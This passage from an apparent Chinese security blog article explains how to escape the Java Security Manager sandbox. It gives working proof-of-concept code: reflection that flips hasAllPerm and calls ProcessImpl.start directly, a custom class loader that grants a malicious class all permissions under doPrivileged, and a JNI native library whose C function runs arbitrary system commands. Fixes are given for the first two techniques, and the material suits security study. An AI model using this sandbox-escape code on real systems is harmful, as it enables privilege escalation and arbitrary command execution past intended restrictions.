<p>运行一下，又抛出了异常<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">java.security.AccessControlException: <span class="function">access <span class="title">denied</span> <span class="params">(<span class="string">"java.lang.RuntimePermission"</span> <span class="string">"getProtectionDomain"</span>)</span></span></span><br><span class="line"><span class="function">	at java.security.AccessControlContext.<span class="title">checkPermission</span><span class="params">(AccessControlContext.java:<span class="number">472</span>)</span></span></span><br><span class="line"><span class="function">	at java.security.AccessController.<span class="title">checkPermission</span><span class="params">(AccessController.java:<span class="number">884</span>)</span></span></span><br><span class="line"><span class="function">	at java.lang.SecurityManager.<span class="title">checkPermission</span><span class="params">(SecurityManager.java:<span class="number">549</span>)</span></span></span><br><span class="line"><span class="function">	at java.lang.Class.<span class="title">getProtectionDomain</span><span class="params">(Class.java:<span class="number">2299</span>)</span></span></span><br><span class="line"><span class="function">	at evil.Poc.<span class="title">setHasAllPerm</span><span class="params">(Poc.java:<span class="number">43</span>)</span></span></span><br><span class="line"><span class="function">	at evil.Poc.<span class="title">main</span><span class="params">(Poc.java:<span class="number">19</span>)</span></span></span><br></pre></td></tr></table></figure></p>
<p>没有getProtectionDomain的权限。我们看看getProtectionDomain的实现：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> java.security.<span class="function">ProtectionDomain <span class="title">getProtectionDomain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    SecurityManager sm = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//在这里检查权限</span></span><br><span class="line">        sm.checkPermission(SecurityConstants.GET_PD_PERMISSION);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//调用native方法获取ProtectionDomain</span></span><br><span class="line">    java.security.ProtectionDomain pd = getProtectionDomain0();</span><br><span class="line">    <span class="keyword">if</span> (pd == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (allPermDomain == <span class="keyword">null</span>) &#123;</span><br><span class="line">            java.security.Permissions perms =</span><br><span class="line">                <span class="keyword">new</span> java.security.Permissions();</span><br><span class="line">            perms.add(SecurityConstants.ALL_PERMISSION);</span><br><span class="line">            allPermDomain =</span><br><span class="line">                <span class="keyword">new</span> java.security.ProtectionDomain(<span class="keyword">null</span>, perms);</span><br><span class="line">        &#125;</span><br><span class="line">        pd = allPermDomain;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> java.security.<span class="function">ProtectionDomain <span class="title">getProtectionDomain0</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure></p>
<p>getProtectionDomain方法中，先检查了权限，然后再调用私有的原生方法getProtectionDomain0来完成getProtectionDomain。那么我们完全可以通过反射直接运行getProtectionDomain0方法，从而绕过对getProtectionDomain方法的权限检查。代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setHasAllPerm0</span><span class="params">()</span></span>&#123;</span><br><span class="line">        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();</span><br><span class="line">        <span class="comment">//遍历栈帧</span></span><br><span class="line">        <span class="keyword">for</span> (StackTraceElement stackTraceElement : stackTraceElements) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class clz=Class.forName(stackTraceElement.getClassName());</span><br><span class="line">                <span class="comment">//利用反射调用getProtectionDomain0方法</span></span><br><span class="line">                Method getProtectionDomain=clz.getClass().getDeclaredMethod(<span class="string">"getProtectionDomain0"</span>,<span class="keyword">null</span>);</span><br><span class="line">                getProtectionDomain.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                ProtectionDomain pd=(ProtectionDomain) getProtectionDomain.invoke(clz);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(pd!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    Field field=pd.getClass().getDeclaredField(<span class="string">"hasAllPerm"</span>);</span><br><span class="line">                    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    field.set(pd,<span class="keyword">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>运行，如下图所示，同样policy文件没有赋予文件的执行权限，却执行calc成功，成功绕过java security manager机制，逃逸沙箱。</p>
<p>java.policy:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.lang.reflect.ReflectPermission &quot;suppressAccessChecks&quot;;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;accessDeclaredMembers&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/07/10/5b449c0760768.png" alt="bypass-by-reflection.PNG"></p>
<p>exp地址：<a href="https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/bypass-by-reflection" target="_blank" rel="noopener">https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/bypass-by-reflection</a></p>
<p>修复方法：不授予accessDeclaredMembers权限和suppressAccessChecks权限。</p>
<p>然而在java中，反射是一个非常常见的操作，如果由于业务需要，无法禁用反射，可以设置禁止反射的方法和变量的黑名单。还记得上面无法反射System类中security的原因吗？在sun.reflect.Reflection中定义了静态的methodFilterMap和fieldMethodMap，在这里面的方法和变量禁止反射。sun.reflect.Reflection还提供了几个方法，可以往methodFilterMap和fieldMethodMap中添加自定义的黑名单。代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">registerFieldsToFilter</span><span class="params">(Class&lt;?&gt; var0, String... var1)</span> </span>&#123;</span><br><span class="line">    fieldFilterMap = registerFilter(fieldFilterMap, var0, var1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">registerMethodsToFilter</span><span class="params">(Class&lt;?&gt; var0, String... var1)</span> </span>&#123;</span><br><span class="line">    methodFilterMap = registerFilter(methodFilterMap, var0, var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这样，只需要在加载恶意代码之前，把禁止反射的黑名单加入这两个map即可。</p>
<p>使用这种方式时，需要注意，有些方法的实现是，在public方法里面调用security manager检查权限，然后调用一个protect或者private方法实现功能。这样，攻击者可以直接反射实现功能的方法，绕过security manager的检查。例如平时我们调用<code>Runtime.getRuntime().exec(command)</code>，调用链如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String[] cmdarray, String[] envp, File dir)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ProcessBuilder(cmdarray)</span><br><span class="line">        .environment(envp)</span><br><span class="line">        .directory(dir)</span><br><span class="line">        .start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里执行命令的功能是调用ProcessBuilder实现的。我们跟进去看一下start方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">//省略部分代码</span></span><br><span class="line"></span><br><span class="line">    SecurityManager security = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (security != <span class="keyword">null</span>)</span><br><span class="line">        security.checkExec(prog);</span><br><span class="line">    <span class="comment">//在这里检查了是否有执行命令的权限</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//省略部分代码</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ProcessImpl.start(cmdarray,</span><br><span class="line">                                 environment,</span><br><span class="line">                                 dir,</span><br><span class="line">                                 redirects,</span><br><span class="line">                                 redirectErrorStream);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//最后调用ProcessImpl.start实现这个功能。</span></span><br><span class="line">    <span class="comment">//省略部分代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>从代码中我们看到，正如前面所说，完成功能的是ProcessImpl.start方法，而在这个方法调用之前，security manager就已经完成了检测，于是，反射这个方法，调用它，就可以绕过检测。代码如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">executeCommandWithReflection</span><span class="params">(String command)</span></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class clz = Class.forName(<span class="string">"java.lang.ProcessImpl"</span>);</span><br><span class="line">        Method method = clz.getDeclaredMethod(<span class="string">"start"</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="keyword">boolean</span>.class);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        method.invoke(clz,<span class="keyword">new</span> String[]&#123;command&#125;,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">false</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="创建类加载器绕过java-security-manager"><a href="#创建类加载器绕过java-security-manager" class="headerlink" title="创建类加载器绕过java security manager"></a>创建类加载器绕过java security manager</h4><p>如前面所说，一个类的ProtectionDomain在这个类被类加载器加载时初始化，如果我们能自定义一个类加载器，加载一个恶意类，并且把它的ProtectionDomain里面的权限初始化成所有权限，这个恶意类不就可以有所有权限了吗？即便如此，这个恶意类被调用时，它仅仅是栈中的一个栈帧，在它下面的栈帧对应的权限仍是policy文件指定的权限。</p>
<p>这个时候就是doPrivileged发挥作用的时候了，如上面所说，AccessController会自顶向下遍历栈帧，如果遍历到doPrivileged，它会检查到调用doPrivileged方法的栈帧为止。只要我们在恶意类中调用doPrivileged方法，AccessController只会向下遍历检查到恶意类所在的栈帧，而恶意类对应的权限是所有权限，这样就可以绕过Java Security Manager。</p>
<p>java.policy如下，这里需要读class文件，所以需要读文件权限<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant&#123;</span><br><span class="line">    permission java.lang.RuntimePermission <span class="string">"createClassLoader"</span>;</span><br><span class="line">    permission java.io.FilePermission <span class="string">"&lt;&lt;ALL FILES&gt;&gt;"</span>, <span class="string">"read"</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>恶意类：com.evil.EvilClass<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="comment">//在doPrivileged中执行恶意操作</span></span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span>  PrivilegedAction()  &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span>  Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Process process = Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>自定义类加载器：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//.....省略部分代码</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        File file = getClassFile(name);</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//获取byte数组的字节码</span></span><br><span class="line">            <span class="keyword">byte</span>[] bytes = getClassBytes(file);</span><br><span class="line">            <span class="comment">//这里没有调用父类的defineClass方法，而是调用了下面的defineClazz方法。</span></span><br><span class="line">            Class&lt;?&gt; c = defineClazz(name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在这个自定义的defineClazz方法中</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClazz(String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span><br><span class="line">            <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PermissionCollection pc=ClassLoader.class.getProtectionDomain().getPermissions();</span><br><span class="line">            <span class="comment">//赋予ClassLoader类的权限，其实就是所有权限</span></span><br><span class="line">            ProtectionDomain pd=<span class="keyword">new</span> ProtectionDomain(<span class="keyword">new</span> CodeSource(<span class="keyword">null</span>, (Certificate[]) <span class="keyword">null</span>),</span><br><span class="line">                    pc, <span class="keyword">this</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//调用父类的defineClass完成功能</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.defineClass(name, b, off, len, pd);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//.....省略部分代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在findClass方法中，我们并没有直接调用父类的defineClass方法，因为在父类的defineClass方法中：</p>
<p>java.lang.ClassLoader line639<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//最后一个参数是传入的ProtectionDomain</span></span><br><span class="line">    <span class="comment">//这个函数的实现抄录在下面</span></span><br><span class="line">    <span class="keyword">return</span> defineClass(name, b, off, len, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>跟一下defineClass<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len,</span><br><span class="line">                                     ProtectionDomain protectionDomain)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//preDefineClass的实现在下面</span></span><br><span class="line">    protectionDomain = preDefineClass(name, protectionDomain);</span><br><span class="line">    String source = defineClassSourceLocation(protectionDomain);</span><br><span class="line">    Class&lt;?&gt; c = defineClass1(name, b, off, len, protectionDomain, source);</span><br><span class="line">    postDefineClass(c, protectionDomain);</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>跟一下preDefineClass<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ProtectionDomain <span class="title">preDefineClass</span><span class="params">(String name,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        ProtectionDomain pd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!checkName(name))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NoClassDefFoundError(<span class="string">"IllegalName: "</span> + name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Note:  Checking logic in java.lang.invoke.MemberName.checkForTypeAlias</span></span><br><span class="line">    <span class="comment">// relies on the fact that spoofing is impossible if a class has a name</span></span><br><span class="line">    <span class="comment">// of the form "java.*"</span></span><br><span class="line">    <span class="keyword">if</span> ((name != <span class="keyword">null</span>) &amp;&amp; name.startsWith(<span class="string">"java."</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException</span><br><span class="line">            (<span class="string">"Prohibited package name: "</span> +</span><br><span class="line">             name.substring(<span class="number">0</span>, name.lastIndexOf(<span class="string">'.'</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pd == <span class="keyword">null</span>) &#123;</span><br><span class="line">        pd = defaultDomain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (name != <span class="keyword">null</span>) checkCerts(name, pd.getCodeSource());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>传入的默认ProtectionDomain是null。我们调用了defineClazz方法，赋予了加载的类所有的权限，然后传入defineClass方法，完成类加载过程。如下图所示，同样policy文件没有赋予文件的执行权限，却执行calc成功，成功绕过java security manager机制，逃逸沙箱。</p>
<p>java.policy:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant&#123;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;createClassLoader&quot;;</span><br><span class="line">    permission java.io.FilePermission &quot;&lt;&lt;ALL FILES&gt;&gt;&quot;, &quot;read&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/07/10/5b449c0760de3.png" alt="bypass-by-createclassloader.PNG"></p>
<p>exp地址：<a href="https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/bypass-by-createclassloader" target="_blank" rel="noopener">https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/bypass-by-createclassloader</a></p>
<p>修复方法：禁止createClassLoader</p>
<h4 id="本地方法调用绕过Java-Security-Manager"><a href="#本地方法调用绕过Java-Security-Manager" class="headerlink" title="本地方法调用绕过Java Security Manager"></a>本地方法调用绕过Java Security Manager</h4><p>Java Security Manager是在java核心库中的一个功能，而java中native方法是由jvm执行的，不受java security manager管控。因此，我们可以调用java native方法，绕过java security manager。</p>
<p>java.policy<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant&#123;</span><br><span class="line">permission java.lang.RuntimePermission &quot;loadLibrary.*&quot;;</span><br><span class="line">permission java.io.FilePermission &quot;/root/-&quot;, &quot;read&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>声明一个native方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilMethodClass</span> </span>&#123;</span><br><span class="line">    <span class="comment">//加载动态链接库</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.load(<span class="string">"/root/libEvilMethodClass.so"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//声明一个native方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">evilMethod</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>生成.h头<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac src/com/evil/EvilMethodClass.java -d ./bin</span><br><span class="line">javah -jni -classpath ./bin -d ./jni com.evil.EvilMethodClass</span><br><span class="line">javah -jni -classpath ./bin -o EvilMethodClass.h com.evil.EvilMethodClass</span><br></pre></td></tr></table></figure></p>
<p>新建EvilMethodClass.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"com_evil_EvilMethodClass.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT jstring JNICALL <span class="title">Java_com_evil_EvilMethodClass_evilMethod</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        JNIEnv *env, jclass cls, jstring j_str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *c_str = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    c_str = (*env)-&gt;GetStringUTFChars(env, j_str, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (c_str == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"out of memory.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//在这里执行系统命令</span></span><br><span class="line">    system(c_str);</span><br><span class="line">    (*env)-&gt;ReleaseStringUTFChars(env, j_str, c_str);</span><br><span class="line">    <span class="keyword">return</span> (*env)-&gt;NewStringUTF(env, buff);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></p>
<p>编译，生成动态链接库<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -I$JAVA_HOME/include -I$JAVA_HOME/include/linux -fPIC -shared EvilMethodClass.c -o libEvilMethodClass.so</span><br></pre></td></tr></table></figure></p>
